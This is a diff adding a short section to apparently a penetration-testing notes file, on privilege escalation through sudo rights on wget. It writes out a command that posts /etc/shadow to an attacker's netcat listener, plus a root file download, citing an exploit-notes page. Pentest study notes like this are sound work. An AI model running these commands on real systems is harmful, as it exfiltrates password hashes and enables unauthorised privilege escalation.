@@ -349,6 +349,25 @@ References:
 
 ----------------------------
 
+### PRIVESC with /usr/bin/wget
+
+![image](https://github.com/user-attachments/assets/592ffb4a-8c02-479f-b0be-6bc6b131435d)
+
+- File read,set up a listener with nc on your attack machine to receive
+- Send file with
+
+      sudo -u root /usr/bin/wget post-file=/etc/shadow <ip>:<port>
+
+- To receive file
+
+      sudo -u root /usr/bin/wget http://<ip>:<port>/filename -O <save name>
+
+### REFERENCES
+
+- [HDKS](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-wget-privilege-escalation/)
+
+----------------------------
+
 
 
 
